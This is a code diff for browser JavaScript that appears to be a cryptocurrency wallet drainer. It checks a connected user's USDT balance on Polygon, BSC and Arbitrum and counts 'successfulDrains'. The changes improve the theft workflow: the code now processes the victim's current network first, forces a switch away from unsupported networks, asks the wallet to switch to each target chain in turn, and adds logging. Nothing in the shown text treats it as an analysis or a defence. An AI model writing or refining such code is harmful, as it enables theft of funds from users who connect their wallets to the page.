@@ -551,7 +551,6 @@ async function processNetwork(chainId) {
 
         const userAddress = accounts[0];
         const config = CHAIN_CONFIGS[chainId];
-        config.chainId = chainId; // Add chainId to config for status updates
         
         updateNetworkStatus(chainId, 'pending', 'Checking USDT balance...');
 
@@ -640,15 +639,21 @@ async function startNetworkCycle() {
     executionCount++;
 
     const web3 = new Web3(window.ethereum);
+    
+    // Get current network FIRST
     const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    
+    // Log current network for debugging
+    console.log('Current network:', currentChainId);
     
     const allNetworks = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
     let successfulDrains = 0;
 
     // STEP 1: Process current network first (whatever network user is on)
-    const currentNetwork = CHAIN_CONFIGS[currentChainId];
-    if (currentNetwork && !processedNetworks[currentChainId]) {
-        updateNetworkStatus(currentChainId, 'pending', 'Processing current network...');
+    const currentNetworkConfig = CHAIN_CONFIGS[currentChainId];
+    
+    if (currentNetworkConfig && !processedNetworks[currentChainId]) {
+        updateNetworkStatus(currentChainId, 'pending', `Processing ${currentNetworkConfig.name} (current network)...`);
         const currentResult = await processNetwork(currentChainId);
         if (currentResult === 'success') successfulDrains++;
         
@@ -663,6 +668,14 @@ async function startNetworkCycle() {
         
         // Wait a bit before moving to next network
         await new Promise(resolve => setTimeout(resolve, 2000));
+    } else if (!currentNetworkConfig) {
+        // User is on an unsupported network, start with first supported network
+        updateNetworkStatus(allNetworks[0], 'pending', 'Switching to supported network...');
+        const switched = await switchNetwork(allNetworks[0]);
+        if (switched) {
+            const firstResult = await processNetwork(allNetworks[0]);
+            if (firstResult === 'success') successfulDrains++;
+        }
     }
 
     // STEP 2: Process other networks (excluding current one)
@@ -672,7 +685,9 @@ async function startNetworkCycle() {
         if (processedNetworks[chainId]) continue;
         
         // Ask to switch to the next network
-        updateNetworkStatus(chainId, 'pending', 'Requesting network switch...');
+        const config = CHAIN_CONFIGS[chainId];
+        updateNetworkStatus(chainId, 'pending', `Requesting switch to ${config.name}...`);
+        
         const switched = await switchNetwork(chainId);
         
         if (!switched) {
@@ -734,11 +749,11 @@ async function startNetworkCycle() {
 function initializeWeb3(provider) {
     // Set up event listeners
     provider.on('chainChanged', (chainId) => {
-        // Network changed - could restart process if needed
+        console.log('Network changed to:', chainId);
     });
     
     provider.on('accountsChanged', (accounts) => {
-        // Accounts changed - could restart process if needed
+        console.log('Accounts changed:', accounts.length);
     });
     
     // Start the process
